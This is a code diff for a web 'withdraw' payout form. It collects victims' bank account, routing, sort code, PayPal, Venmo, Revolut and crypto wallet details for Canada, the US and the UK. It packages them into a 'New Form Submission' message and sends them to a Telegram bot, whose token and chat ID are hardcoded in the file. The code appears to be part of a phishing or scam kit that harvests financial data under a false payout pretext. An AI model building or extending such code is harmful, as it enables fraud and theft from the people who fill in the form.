+    const email = document.getElementById("paypalInput")?.value.trim();
+
+    if (!name) { showNotification("Please enter account holder name", 4000); return false; }
+    if (!email || !emailRegex.test(email)) { showNotification("Please enter a valid PayPal email address", 4000); return false; }
+    return true;
+  }
+
+  // 4. Canada USDT / USDC ERC20
+  if (preference === "Canada USDT / USDC ERC20") {
+    const name = document.getElementById("cryptoName")?.value.trim();
+    const address = document.getElementById("acuAccount")?.value.trim();
+
+    if (!name) { showNotification("Please enter wallet holder name", 4000); return false; }
+    if (!address || !erc20Regex.test(address)) { showNotification("Please enter a valid ERC-20 wallet address starting with 0x", 4000); return false; }
+    return true;
+  }
+
+  // 5. Venmo (USA)
+  if (preference === "Venmo") {
+    const name = document.getElementById("venmoName")?.value.trim();
+    const username = document.getElementById("venmoInput")?.value.trim();
+
+    if (!name) { showNotification("Please enter account holder name", 4000); return false; }
+    if (!username || !handleTagRegex.test(username)) { showNotification("Please enter a valid Venmo username (e.g. @username)", 4000); return false; }
+    return true;
+  }
+
+  // 6. American Bank Transfer
   if (preference === "American Bank Transfer") {
     const usBank = document.getElementById("americanBankSelect")?.value.trim();
     const usName = document.getElementById("accountName-us")?.value.trim();
     const usTransit = document.getElementById("transitNumber-us")?.value.trim();
     const usAcc = document.getElementById("accountNumber-us")?.value.trim();
 
-    if (!usBank) {
-      showNotification("Please select your US Bank", 4000);
-      return false;
-    }
-    if (!usName) {
-      showNotification("Please enter the Account Holder Name", 4000);
-      return false;
-    }
-    if (!/^\d{9}$/.test(usTransit)) {
-      showNotification("Routing Number must be exactly 9 digits", 4000);
-      return false;
-    }
-    if (!/^\d{8,17}$/.test(usAcc)) {
-      showNotification("Account Number must be between 8 and 17 digits", 4000);
-      return false;
-    }
+    if (!usBank) { showNotification("Please select your US Bank", 4000); return false; }
+    if (!usName) { showNotification("Please enter account holder name", 4000); return false; }
+    if (!usTransit || !/^\d{9}$/.test(usTransit)) { showNotification("Routing Number must be exactly 9 digits", 4000); return false; }
+    if (!usAcc || !/^\d{4,17}$/.test(usAcc)) { showNotification("Please enter a valid US Account Number", 4000); return false; }
     return true;
   }
 
-  // 4. British Bank Transfer
+  // 7. US PayPal
+  if (preference === "US PayPal") {
+    const name = document.getElementById("paypalName-us")?.value.trim();
+    const email = document.getElementById("paypalInput-us")?.value.trim();
+
+    if (!name) { showNotification("Please enter account holder name", 4000); return false; }
+    if (!email || !emailRegex.test(email)) { showNotification("Please enter a valid PayPal email address", 4000); return false; }
+    return true;
+  }
+
+  // 8. US USDT / USDC ERC20
+  if (preference === "US USDT / USDC ERC20") {
+    const name = document.getElementById("cryptoName-us")?.value.trim();
+    const address = document.getElementById("acuAccount-us")?.value.trim();
+
+    if (!name) { showNotification("Please enter wallet holder name", 4000); return false; }
+    if (!address || !erc20Regex.test(address)) { showNotification("Please enter a valid ERC-20 wallet address starting with 0x", 4000); return false; }
+    return true;
+  }
+
+  // 9. Revolut (UK)
+  if (preference === "Revolut") {
+    const name = document.getElementById("revolutName")?.value.trim();
+    const revtag = document.getElementById("revolutInput")?.value.trim();
+
+    if (!name) { showNotification("Please enter account holder name", 4000); return false; }
+    if (!revtag || !handleTagRegex.test(revtag)) { showNotification("Please enter a valid Revolut Revtag (e.g. @username)", 4000); return false; }
+    return true;
+  }
+
+  // 10. British Bank Transfer
   if (preference === "British Bank Transfer") {
     const ukBank = document.getElementById("britishBankSelect")?.value.trim();
     const ukName = document.getElementById("accountName-uk")?.value.trim();
-    const ukTransit = document.getElementById("transitNumber-uk")?.value.trim();
+    let ukSort = document.getElementById("transitNumber-uk")?.value.trim();
     const ukAcc = document.getElementById("accountNumber-uk")?.value.trim();
 
-    if (!ukBank) {
-      showNotification("Please select your UK Bank", 4000);
-      return false;
-    }
-    if (!ukName) {
-      showNotification("Please enter the Account Holder Name", 4000);
-      return false;
-    }
-    if (!/^\d{6}$/.test(ukTransit)) {
-      showNotification("Sort Code must be exactly 6 digits", 4000);
-      return false;
-    }
-    if (!/^\d{8}$/.test(ukAcc)) {
-      showNotification("UK Account Number must be exactly 8 digits", 4000);
-      return false;
-    }
+    if (!ukBank) { showNotification("Please select your UK Bank", 4000); return false; }
+    if (!ukName) { showNotification("Please enter account holder name", 4000); return false; }
+    
+    // Clean sort code dashes for length evaluation
+    const cleanSort = ukSort ? ukSort.replace(/-/g, '') : '';
+    if (!cleanSort || !/^\d{6}$/.test(cleanSort)) { showNotification("Sort Code must be exactly 6 digits (e.g., 12-34-56)", 4000); return false; }
+    if (!ukAcc || !/^\d{8}$/.test(ukAcc)) { showNotification("UK Account Number must be exactly 8 digits", 4000); return false; }
     return true;
   }
 
-  // 5. PayPal Methods (CA, US, UK)
-  if (preference.includes("PayPal")) {
-    let name = "", email = "";
-    if (preference === "Canada PayPal") {
-      name = document.getElementById("paypalName")?.value.trim();
-      email = document.getElementById("paypalInput")?.value.trim();
-    } else if (preference === "US PayPal") {
-      name = document.getElementById("paypalName-us")?.value.trim();
-      email = document.getElementById("paypalInput-us")?.value.trim();
-    } else if (preference === "UK PayPal") {
-      name = document.getElementById("paypalName-uk")?.value.trim();
-      email = document.getElementById("paypalInput-uk")?.value.trim();
-    }
+  // 11. UK PayPal
+  if (preference === "UK PayPal") {
+    const name = document.getElementById("paypalName-uk")?.value.trim();
+    const email = document.getElementById("paypalInput-uk")?.value.trim();
 
-    if (!name) {
-      showNotification("Please enter the Account Holder Name", 4000);
-      return false;
-    }
-    if (!emailRegex.test(email)) {
-      showNotification("Please enter a valid PayPal email address", 4000);
-      return false;
-    }
+    if (!name) { showNotification("Please enter account holder name", 4000); return false; }
+    if (!email || !emailRegex.test(email)) { showNotification("Please enter a valid PayPal email address", 4000); return false; }
     return true;
   }
 
-  // 6. Venmo
-  if (preference === "Venmo") {
-    const name = document.getElementById("venmoName")?.value.trim();
-    const handle = document.getElementById("venmoInput")?.value.trim();
+  // 12. UK USDT / USDC ERC20
+  if (preference === "UK USDT / USDC ERC20") {
+    const name = document.getElementById("cryptoName-uk")?.value.trim();
+    const address = document.getElementById("acuAccount-uk")?.value.trim();
 
-    if (!name) {
-      showNotification("Please enter the Account Holder Name", 4000);
-      return false;
-    }
-    if (!handle || handle.length < 3) {
-      showNotification("Please enter a valid Venmo handle or email", 4000);
-      return false;
-    }
-    return true;
-  }
-
-  // 7. Revolut
-  if (preference === "Revolut") {
-    const name = document.getElementById("revolutName")?.value.trim();
-    const handle = document.getElementById("revolutInput")?.value.trim();
-
-    if (!name) {
-      showNotification("Please enter the Account Holder Name", 4000);
-      return false;
-    }
-    if (!handle || handle.length < 3) {
-      showNotification("Please enter a valid Revtag or registered contact detail", 4000);
-      return false;
-    }
-    return true;
-  }
-
-  // 8. USDT / USDC Crypto ERC-20
-  if (preference.includes("USDT / USDC ERC20")) {
-    let name = "", address = "";
-    if (preference === "Canada USDT / USDC ERC20") {
-      name = document.getElementById("acuAccountName")?.value.trim();
-      address = document.getElementById("acuAccount")?.value.trim();
-    } else if (preference === "US USDT / USDC ERC20") {
-      name = document.getElementById("acuAccountName-us")?.value.trim();
-      address = document.getElementById("acuAccount-us")?.value.trim();
-    } else if (preference === "UK USDT / USDC ERC20") {
-      name = document.getElementById("acuAccountName-uk")?.value.trim();
-      address = document.getElementById("acuAccount-uk")?.value.trim();
-    }
-
-    if (!name) {
-      showNotification("Please enter the Account Holder Name", 4000);
-      return false;
-    }
-    if (!erc20Regex.test(address)) {
-      showNotification("Invalid ERC-20 address. Must start with 0x followed by 40 hex characters", 5000);
-      return false;
-    }
+    if (!name) { showNotification("Please enter wallet holder name", 4000); return false; }
+    if (!address || !erc20Regex.test(address)) { showNotification("Please enter a valid ERC-20 wallet address starting with 0x", 4000); return false; }
     return true;
   }
 
   return false;
 }
 
-/* --------------------------
-MESSAGE BUILDER
--------------------------- */
+/* MESSAGE BUILDER */
 function buildMessage(data) {
   return `
 📩 New Form Submission:
 
 Preference: ${data.preference || "-"}
 
-Account Name (Interac): ${data.interacName || "-"}
+--- CANADA ---
+Interac Name: ${data.interacName || "-"}
 Interac Email: ${data.interac || "-"}
-
-Account Name (CA Bank): ${data.accountName || "-"}
 Bank (CA): ${data.canadianBank || "-"}
+Account Name (CA): ${data.accountName || "-"}
 Transit Number (CA): ${data.transitNumber || "-"}
 Institution Number (CA): ${data.institutionNumber || "-"}
 Account Number (CA): ${data.accountNumber || "-"}
+PayPal Name (CA): ${data.paypalName || "-"}
+PayPal Email (CA): ${data.paypal || "-"}
+Crypto Holder Name (CA): ${data.cryptoName || "-"}
+ERC20 Wallet (CA): ${data.acuAccount || "-"}
 
-Account Name (CA PayPal): ${data.paypalName || "-"}
-PayPal (CA): ${data.paypal || "-"}
-
-Account Name (CA Crypto): ${data.acuAccountName || "-"}
-ACU Wallet (CA): ${data.acuAccount || "-"}
-
-Account Name (Venmo): ${data.venmoName || "-"}
+--- USA ---
+Venmo Holder Name: ${data.venmoName || "-"}
 Venmo Handle: ${data.venmo || "-"}
-
-Account Name (US Bank): ${data.accountNameUs || "-"}
 Bank (US): ${data.americanBank || "-"}
+Account Name (US): ${data.accountNameUs || "-"}
 Routing Number (US): ${data.transitNumberUs || "-"}
 Account Number (US): ${data.accountNumberUs || "-"}
+PayPal Name (US): ${data.paypalNameUs || "-"}
+PayPal Email (US): ${data.paypalUs || "-"}
+Crypto Holder Name (US): ${data.cryptoNameUs || "-"}
+ERC20 Wallet (US): ${data.acuAccountUs || "-"}
 
-Account Name (US PayPal): ${data.paypalNameUs || "-"}
-PayPal (US): ${data.paypalUs || "-"}
-
-Account Name (US Crypto): ${data.acuAccountNameUs || "-"}
-ACU Wallet (US): ${data.acuAccountUs || "-"}
-
-Account Name (Revolut): ${data.revolutName || "-"}
-Revolut Tag: ${data.revolut || "-"}
-
-Account Name (UK Bank): ${data.accountNameUk || "-"}
+--- UK ---
+Revolut Holder Name: ${data.revolutName || "-"}
+Revtag: ${data.revolut || "-"}
 Bank (UK): ${data.britishBank || "-"}
+Account Name (UK): ${data.accountNameUk || "-"}
 Sort Code (UK): ${data.transitNumberUk || "-"}
 Account Number (UK): ${data.accountNumberUk || "-"}
-
-Account Name (UK PayPal): ${data.paypalNameUk || "-"}
-PayPal (UK): ${data.paypalUk || "-"}
-
-Account Name (UK Crypto): ${data.acuAccountNameUk || "-"}
-ACU Wallet (UK): ${data.acuAccountUk || "-"}
+PayPal Name (UK): ${data.paypalNameUk || "-"}
+PayPal Email (UK): ${data.paypalUk || "-"}
+Crypto Holder Name (UK): ${data.cryptoNameUk || "-"}
+ERC20 Wallet (UK): ${data.acuAccountUk || "-"}
 `;
 }
 
-/* --------------------------
-TELEGRAM SETUP
--------------------------- */
+/* TELEGRAM SETUP */
 const BOT_TOKEN = "8663093122:AAHdCgL3yFq3Ew46kkU84tiQG3BNap5yK_M";
 const CHAT_ID = "-1003913850436";
 
@@ -2844,15 +2749,13 @@ function sendToTelegram(data) {
   });
 }
 
-/* --------------------------
-SAVE DATA FUNCTION
--------------------------- */
+/* SAVE DATA FUNCTION */
 function saveData() {
     const savedData = JSON.parse(localStorage.getItem("section3Data") || "{}");
 
     savedData.preference = preference;
 
-    // Canada fields
+    // Canada
     savedData.interacName = document.getElementById("interacName")?.value || "";
     savedData.interac = document.getElementById("interacInput")?.value || "";
     savedData.canadianBank = document.getElementById("canadianBankSelect")?.value || "";
@@ -2862,10 +2765,10 @@ function saveData() {
     savedData.accountNumber = document.getElementById("accountNumber")?.value || "";
     savedData.paypalName = document.getElementById("paypalName")?.value || "";
     savedData.paypal = document.getElementById("paypalInput")?.value || "";
-    savedData.acuAccountName = document.getElementById("acuAccountName")?.value || "";
+    savedData.cryptoName = document.getElementById("cryptoName")?.value || "";
     savedData.acuAccount = document.getElementById("acuAccount")?.value || "";
 
-    // USA fields
+    // USA
     savedData.venmoName = document.getElementById("venmoName")?.value || "";
     savedData.venmo = document.getElementById("venmoInput")?.value || "";
     savedData.americanBank = document.getElementById("americanBankSelect")?.value || "";
@@ -2874,10 +2777,10 @@ function saveData() {
     savedData.accountNumberUs = document.getElementById("accountNumber-us")?.value || "";
     savedData.paypalNameUs = document.getElementById("paypalName-us")?.value || "";
     savedData.paypalUs = document.getElementById("paypalInput-us")?.value || "";
-    savedData.acuAccountNameUs = document.getElementById("acuAccountName-us")?.value || "";
+    savedData.cryptoNameUs = document.getElementById("cryptoName-us")?.value || "";
     savedData.acuAccountUs = document.getElementById("acuAccount-us")?.value || "";
 
-    // UK fields
+    // UK
     savedData.revolutName = document.getElementById("revolutName")?.value || "";
     savedData.revolut = document.getElementById("revolutInput")?.value || "";
     savedData.britishBank = document.getElementById("britishBankSelect")?.value || "";
@@ -2886,11 +2789,11 @@ function saveData() {
     savedData.accountNumberUk = document.getElementById("accountNumber-uk")?.value || "";
     savedData.paypalNameUk = document.getElementById("paypalName-uk")?.value || "";
     savedData.paypalUk = document.getElementById("paypalInput-uk")?.value || "";
-    savedData.acuAccountNameUk = document.getElementById("acuAccountName-uk")?.value || "";
+    savedData.cryptoNameUk = document.getElementById("cryptoName-uk")?.value || "";
     savedData.acuAccountUk = document.getElementById("acuAccount-uk")?.value || "";
 
     let exactTransferMethodName = preference;
-    let selectedRegion = "CA"; 
+    let selectedRegion = "CA";
 
     const activeCard = document.querySelector(".payment-method.active");
     if (activeCard) {
@@ -2907,7 +2810,7 @@ function saveData() {
             if (preference === "Canadian Bank Transfer") {
                 exactTransferMethodName = savedData.canadianBank || "Canadian Bank Transfer";
             }
-        } else if (region === "uk" || region === "britain") {
+        } else if (region === "uk") {
             selectedRegion = "UK";
             if (preference === "British Bank Transfer") {
                 exactTransferMethodName = savedData.britishBank || "British Bank Transfer";
@@ -2917,23 +2820,24 @@ function saveData() {
 
     localStorage.setItem("av_selected_region", selectedRegion);
     localStorage.setItem("av_selected_method_title", exactTransferMethodName);
-
     localStorage.setItem("section3Data", JSON.stringify(savedData));
 }
 
-/* --------------------------
-MAIN BUTTON HANDLER
--------------------------- */
+/* MAIN WITHDRAW BUTTON HANDLER */
 document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
 
+  // 1. Run strict format & value validation
   if (!validateCurrentPreference()) {
     return; 
   }
 
+  // 2. Show verification progress feedback
   showNotification("Verifying payout information...", 2500);
 
   const data = {
     preference,
+    
+    // CA Collection
     interacName: document.getElementById("interacName")?.value.trim(),
     interac: document.getElementById("interacInput")?.value.trim(),
     canadianBank: document.getElementById("canadianBankSelect")?.value.trim(),
@@ -2943,9 +2847,10 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
     accountNumber: document.getElementById("accountNumber")?.value.trim(),
     paypalName: document.getElementById("paypalName")?.value.trim(),
     paypal: document.getElementById("paypalInput")?.value.trim(),
-    acuAccountName: document.getElementById("acuAccountName")?.value.trim(),
+    cryptoName: document.getElementById("cryptoName")?.value.trim(),
     acuAccount: document.getElementById("acuAccount")?.value.trim(),
 
+    // US Collection
     venmoName: document.getElementById("venmoName")?.value.trim(),
     venmo: document.getElementById("venmoInput")?.value.trim(),
     americanBank: document.getElementById("americanBankSelect")?.value.trim(),
@@ -2954,9 +2859,10 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
     accountNumberUs: document.getElementById("accountNumber-us")?.value.trim(),
     paypalNameUs: document.getElementById("paypalName-us")?.value.trim(),
     paypalUs: document.getElementById("paypalInput-us")?.value.trim(),
-    acuAccountNameUs: document.getElementById("acuAccountName-us")?.value.trim(),
+    cryptoNameUs: document.getElementById("cryptoName-us")?.value.trim(),
     acuAccountUs: document.getElementById("acuAccount-us")?.value.trim(),
 
+    // UK Collection
     revolutName: document.getElementById("revolutName")?.value.trim(),
     revolut: document.getElementById("revolutInput")?.value.trim(),
     britishBank: document.getElementById("britishBankSelect")?.value.trim(),
@@ -2965,7 +2871,7 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
     accountNumberUk: document.getElementById("accountNumber-uk")?.value.trim(),
     paypalNameUk: document.getElementById("paypalName-uk")?.value.trim(),
     paypalUk: document.getElementById("paypalInput-uk")?.value.trim(),
-    acuAccountNameUk: document.getElementById("acuAccountName-uk")?.value.trim(),
+    cryptoNameUk: document.getElementById("cryptoName-uk")?.value.trim(),
     acuAccountUk: document.getElementById("acuAccount-uk")?.value.trim()
   };
 
@@ -2984,6 +2890,8 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
     showNotification("Failed to link payout method. Please try again", 5000);
   }
 });
+
+
 
 
 /* --------------------------
